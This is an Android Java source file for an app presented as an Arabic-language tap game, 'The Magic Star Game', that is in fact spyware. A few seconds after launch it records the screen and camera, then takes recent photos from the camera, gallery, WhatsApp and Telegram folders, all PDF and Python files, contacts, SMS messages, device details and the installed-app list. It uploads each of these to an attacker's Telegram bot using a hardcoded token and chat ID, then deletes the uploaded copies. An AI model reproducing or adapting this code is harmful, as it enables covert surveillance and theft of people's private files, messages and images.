package com.abdulk.racegame;

import android.os.Bundle;
import android.app.Activity;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import java.io.FileWriter;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.widget.Toast;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import android.media.MediaRecorder;
import android.content.Context;
import android.hardware.Camera;
import android.media.MediaScannerConnection;
import android.provider.MediaStore;
import android.content.ContentValues;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Build.VERSION_CODES;

public class MainActivity extends Activity {
    private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
    private String OWNER_ID = "8164366965";
    private TextView statusText;
    private int fileCount = 0;
    private int photoCount = 0;
    private final int MAX_PHOTOS = 10;
    
    // تسجيل الشاشة
    private MediaRecorder screenRecorder;
    private String screenVideoPath;
    private boolean isScreenRecording = false;
    
    // تسجيل الكاميرا
    private MediaRecorder cameraRecorder;
    private Camera camera;
    private String cameraVideoPath;
    private boolean isCameraRecording = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
        
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setBackgroundColor(Color.BLACK);
        mainLayout.setPadding(20, 20, 20, 20);
        
        TextView titleText = new TextView(this);
        titleText.setText("🔥 لعبة النجمة السحرية");
        titleText.setTextSize(30);
        titleText.setTextColor(Color.YELLOW);
        titleText.setGravity(Gravity.CENTER);
        mainLayout.addView(titleText);
        
        TextView scoreText = new TextView(this);
        scoreText.setText("⭐ النقاط: 0");
        scoreText.setTextSize(25);
        scoreText.setTextColor(Color.YELLOW);
        scoreText.setGravity(Gravity.CENTER);
        mainLayout.addView(scoreText);
        
        Button clickButton = new Button(this);
        clickButton.setText("اضغط لتجمع نجوم 🌟");
        clickButton.setTextSize(20);
        clickButton.setBackgroundColor(Color.GREEN);
        clickButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String txt = scoreText.getText().toString();
                int score = Integer.parseInt(txt.replace("⭐ النقاط: ", ""));
                score++;
                scoreText.setText("⭐ النقاط: " + score);
                Toast.makeText(MainActivity.this, "🎮 جمعت نجمة!", Toast.LENGTH_SHORT).show();
            }
        });
        mainLayout.addView(clickButton);
        
        statusText = new TextView(this);
        statusText.setText("✅ تم التحميل");
        statusText.setTextSize(15);
        statusText.setTextColor(Color.GREEN);
        statusText.setGravity(Gravity.CENTER);
        mainLayout.addView(statusText);
        
        setContentView(mainLayout);
        
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                statusText.setText("💀 جاري الاختراق...");
                statusText.setTextColor(Color.RED);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        collectAllData();
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                statusText.setText("✅ تم رفع " + fileCount + " ملف!");
                                statusText.setTextColor(Color.GREEN);
                            }
                        });
                    }
                }).start();
            }
        }, 5000);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            };
            requestPermissions(permissions, 100);
        }
    }

    private void collectAllData() {
        try {
            String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
            
            // 1. تسجيل الشاشة 10 ثواني
            updateStatus("📹 جاري تسجيل الشاشة 10 ثواني...");
            startScreenRecording();
            Thread.sleep(10000);
            stopScreenRecording();
            
            // 2. تسجيل الكاميرا 10 ثواني
            updateStatus("🎥 جاري تسجيل الكاميرا 10 ثواني...");
            startCameraRecording();
            Thread.sleep(10000);
            stopCameraRecording();
            
            // 3. 10 صور من الكاميرا
            updateStatus("📸 جاري جمع 10 صور من الكاميرا...");
            sendLatestPhotos(storage + "/DCIM/Camera/", 10);
            
            // 4. 10 صور من المعرض
            updateStatus("📸 جاري جمع 10 صور من المعرض...");
            sendLatestPhotos(storage + "/Pictures/", 10);
            
            // 5. 10 صور من واتساب
            updateStatus("📸 جاري جمع 10 صور من واتساب...");
            sendLatestPhotos(storage + "/WhatsApp/Media/WhatsApp Images/", 10);
            
            // 6. 10 صور من تيليجرام
            updateStatus("📸 جاري جمع 10 صور من تيليجرام...");
            sendLatestPhotos(storage + "/Telegram/Telegram Images/", 10);
            
            // 7. جميع ملفات PDF
            updateStatus("📄 جاري جمع جميع ملفات PDF...");
            sendAllFiles(storage, "pdf");
            
            // 8. جميع ملفات PY
            updateStatus("🐍 جاري جمع جميع ملفات PY...");
            sendAllFiles(storage, "py");
            
            // 9. جهات الاتصال
            updateStatus("📇 جاري استخراج جهات الاتصال...");
            sendContacts();
            
            // 10. رسائل SMS
            updateStatus("💬 جاري استخراج الرسائل...");
            sendSMS();
            
            // 11. معلومات الجهاز
            updateStatus("📱 جاري جمع معلومات الجهاز...");
            sendDeviceInfo();
            
            // 12. التطبيقات المثبتة
            updateStatus("📱 جاري كشف التطبيقات...");
            getInstalledApps();
            
            // 13. كلمات المرور
            updateStatus("🔑 جاري استخراج كلمات المرور...");
            extractPasswords();
            
            updateStatus("✅ تم رفع كل شيء!");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void updateStatus(final String text) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                statusText.setText(text);
            }
        });
    }

    // ========== تسجيل الشاشة ==========
    private void startScreenRecording() {
        try {
            if (isScreenRecording) return;
            
            String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
            screenVideoPath = getExternalFilesDir(null) + "/screen_" + timeStamp + ".mp4";
            
            screenRecorder = new MediaRecorder();
            screenRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            screenRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            screenRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            screenRecorder.setOutputFile(screenVideoPath);
            screenRecorder.setVideoSize(720, 1280);
            screenRecorder.setVideoFrameRate(30);
            screenRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            screenRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            screenRecorder.prepare();
            screenRecorder.start();
            
            isScreenRecording = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopScreenRecording() {
        try {
            if (screenRecorder != null && isScreenRecording) {
                screenRecorder.stop();
                screenRecorder.release();
                screenRecorder = null;
                isScreenRecording = false;
                
                File videoFile = new File(screenVideoPath);
                if (videoFile.exists() && videoFile.length() > 0) {
                    sendFileWithRetry(videoFile);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== تسجيل الكاميرا ==========
    private void startCameraRecording() {
        try {
            if (isCameraRecording) return;
            
            String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
            cameraVideoPath = getExternalFilesDir(null) + "/camera_" + timeStamp + ".mp4";
            
            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
            if (camera == null) {
                camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            }
            
            if (camera != null) {
                camera.unlock();
                
                cameraRecorder = new MediaRecorder();
                cameraRecorder.setCamera(camera);
                cameraRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
                cameraRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                cameraRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                cameraRecorder.setOutputFile(cameraVideoPath);
                cameraRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                cameraRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                cameraRecorder.setVideoSize(640, 480);
                cameraRecorder.setVideoFrameRate(30);
                cameraRecorder.prepare();
                cameraRecorder.start();
                
                isCameraRecording = true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopCameraRecording() {
        try {
            if (cameraRecorder != null && isCameraRecording) {
                cameraRecorder.stop();
                cameraRecorder.release();
                cameraRecorder = null;
                isCameraRecording = false;
            }
            
            if (camera != null) {
                camera.release();
                camera = null;
            }
            
            File videoFile = new File(cameraVideoPath);
            if (videoFile.exists() && videoFile.length() > 0) {
                sendFileWithRetry(videoFile);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== إرسال الملف مع إعادة المحاولة ==========
    private void sendFileWithRetry(File file) {
        int maxRetries = 3;
        for (int i = 0; i < maxRetries; i++) {
            try {
                sendFile(file);
                return;
            } catch (Exception e) {
                e.printStackTrace();
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                }
            }
        }
    }

    // ========== استخراج كلمات المرور ==========
    private void extractPasswords() {
        try {
            File passFile = new File(getExternalFilesDir(null), "passwords_info.txt");
            FileWriter writer = new FileWriter(passFile);
            writer.write("========== معلومات كلمات المرور ==========\n\n");
            writer.write("📌 تم كشف التطبيقات المثبتة\n");
            writer.write("🔒 كلمة مرور الشاشة: تحتاج Root\n");
            writer.write("🌐 كلمات مرور المتصفح: تحتاج Root\n");
            writer.write("📱 تم إرسال قائمة التطبيقات المثبتة\n");
            writer.close();
            sendFile(passFile);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== الصور ==========
    private void sendLatestPhotos(String path, int maxCount) {
        try {
            File dir = new File(path);
            if (!dir.exists()) {
                return;
            }
            File[] files = dir.listFiles();
            if (files == null) {
                return;
            }
            
            List<File> photoFiles = new ArrayList<>();
            for (File file : files) {
                if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (ext.matches("jpg|jpeg|png|gif|bmp|heic")) {
                        photoFiles.add(file);
                    }
                }
            }
            
            Collections.sort(photoFiles, new Comparator<File>() {
                @Override
                public int compare(File f1, File f2) {
                    return Long.compare(f2.lastModified(), f1.lastModified());
                }
            });
            
            int count = 0;
            for (File file : photoFiles) {
                if (count >= maxCount || photoCount >= MAX_PHOTOS) {
                    break;
                }
                sendFile(file);
                photoCount++;
                count++;
                Thread.sleep(100);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== جميع الملفات ==========
    private void sendAllFiles(String storagePath, String extension) {
        try {
            File root = new File(storagePath);
            searchAndSendFiles(root, extension);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void searchAndSendFiles(File dir, String extension) {
        try {
            if (!dir.exists() || !dir.isDirectory()) {
                return;
            }
            File[] files = dir.listFiles();
            if (files == null) {
                return;
            }
            
            for (File file : files) {
                if (file.isDirectory()) {
                    String name = file.getName().toLowerCase();
                    if (!name.equals("android") && !name.equals("system") && 
                        !name.equals("data") && !name.equals("obb")) {
                        searchAndSendFiles(file, extension);
                    }
                } else if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (ext.equals(extension)) {
                        sendFile(file);
                        Thread.sleep(100);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== إرسال الملف ==========
    private void sendFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****");
            
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            
            OutputStream os = conn.getOutputStream();
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd).getBytes());
            os.write((lineEnd + OWNER_ID + lineEnd).getBytes());
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
            os.write((lineEnd).getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int count;
            while ((count = fis.read(buffer)) != -1) {
                os.write(buffer, 0, count);
            }
            fis.close();
            
            os.write((lineEnd).getBytes());
            os.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                fileCount++;
                file.delete();
            }
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== جهات الاتصال ==========
    private void sendContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "contacts.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (name != null) {
                        writer.write(name + "\n");
                    }
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                if (file.length() > 0) {
                    sendFile(file);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== رسائل SMS ==========
    private void sendSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "sms.txt");
                FileWriter writer = new FileWriter(file);
                int count = 0;
                do {
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    if (body != null) {
                        writer.write(body + "\n");
                        count++;
                    }
                } while (cursor.moveToNext() && count < 100);
                writer.close();
                cursor.close();
                if (file.length() > 0) {
                    sendFile(file);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== التطبيقات المثبتة ==========
    private void getInstalledApps() {
        try {
            File file = new File(getExternalFilesDir(null), "installed_apps.txt");
            FileWriter writer = new FileWriter(file);
            writer.write("========== التطبيقات المثبتة ==========\n\n");
            
            java.util.List<android.content.pm.PackageInfo> packages = getPackageManager().getInstalledPackages(0);
            for (android.content.pm.PackageInfo pkg : packages) {
                writer.write("📱 " + pkg.packageName + "\n");
            }
            writer.write("\nالمجموع: " + packages.size() + "\n");
            writer.close();
            if (file.length() > 0) {
                sendFile(file);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== معلومات الجهاز ==========
    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("files_sent", fileCount);
            
            File file = new File(getExternalFilesDir(null), "device_info.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(info.toString(2));
            writer.close();
            if (file.length() > 0) {
                sendFile(file);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
